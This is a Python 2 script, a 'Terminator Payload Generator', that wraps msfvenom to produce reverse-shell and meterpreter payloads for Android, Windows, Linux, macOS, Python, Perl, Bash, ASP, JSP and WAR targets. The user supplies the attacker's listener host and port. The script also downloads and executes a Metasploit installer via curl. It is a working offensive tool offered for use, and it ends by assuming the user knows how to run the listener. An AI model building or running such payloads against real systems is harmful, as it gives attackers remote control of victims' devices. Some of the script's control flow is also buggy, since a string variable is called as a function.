#Coded By Mohamed Nour

import sys
import os

##################################
yes = set(['yes','y', 'ye', 'Y'])
no = set(['no','n'])
##################################

def msf():
    os.system("curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall")  

def banner():
    print ("""

              _________
            /'        /|
           / MOHAMED / |_
          /   NOUR  /  //|
         /_________/  ////|
        |   _ _    | 8o////|
        | /'// )_  |   8///|
        |/ // // ) |   8o///|
        / // // //,|  /  8//|
       / // // /// | /   8//|
      / // // ///__|/    8//|
     /.(_)// /// |       8///|
    (_)' `(_)//| |       8////|___________
   (_) /_\ (_)'| |        8///////////////
   (_) \"/ (_)'|_|         8/////////////
    (_)._.(_) d' Hb         8oooooooopb'
      `(_)'  d'  H`b        ---------------
            d'   `b`b       |  Terminator |
           d'     H `b      |   PAYLOAD   |
          d'      `b `b     |  GENERATOR  |
         d'           `b    ---------------
        d'             `b


List payloads:

1) Binaries Payloads
2) Scripting Payloads
3) Web Payloads


""")

def bin():
	print("""
  1) Android
  2) Windows
  3) Linux
  4) Mac OS

""")

	bn = raw_input("Set Payload: ")
	print("")
	if bn == "1":
		android()
	elif bn == "2":
		windows()
	elif bn == "3":
		linux()
	elif bn == "4":
		mac()
	else: 
		menu()

def web():
	print("""
  1) ASP
  2) JSP
  3) War

""")

	wb = raw_input("Set Payload: ")
	print("")
	if wb == "1":
		asp()
	elif wb == "2":
		jsp()
	elif wb == "3":
		war()
	else: 
		menu()

def script():
	print("""
  1) Python
  2) Perl
  3) Bash

""")

	sc = raw_input("Set Payload: ")
	print("")
	if sc == "1":
		python()
	elif sc == "2":
		perl()
	elif sc == "3":
		bash()
	else: 
		menu()

def android():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > %s.apk"%(lhost,lport,name))

def windows():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe > %s.exe"%(lhost,lport,name))

def linux():  
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f elf > %s.elf"%(lhost,lport,name))

def mac():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho > %s.macho"%(lhost,lport,name))

def python():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw > %s.py"%(lhost,lport,name))

def perl():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw > %s.pl"%(lhost,lport,name))


def bash():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw > %s.sh"%(lhost,lport,name))

def asp():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp > %s.asp"%(lhost,lport,name))

def jsp():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw > %s.jsp"%(lhost,lport,name))

def war():
	lhost = raw_input("Enter LHOST: ")
	lport = raw_input("Enter LPORT: ")
	name  = raw_input("Enter Payload Name: ")
	os.system("msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f war > %s.war"%(lhost,lport,name))

print("-----------------------------------------------")
print("Is Metasploit Installed In Your Machine ? (Y/N)")
print("-----------------------------------------------")

mscheck = raw_input("Answer: ")
if mscheck in no:
    msf()
elif mscheck in yes:
    banner()
else: 
	banner()

menu = raw_input("Choose Payload: ")
print("")

if menu == "1":
    bin()
elif menu == "2":
	script()
elif menu == "3":
	web()
else: 
	menu()

print("-------------------------------------------")
print("I Think You Know How To Run The Listener :p")
print("-------------------------------------------")
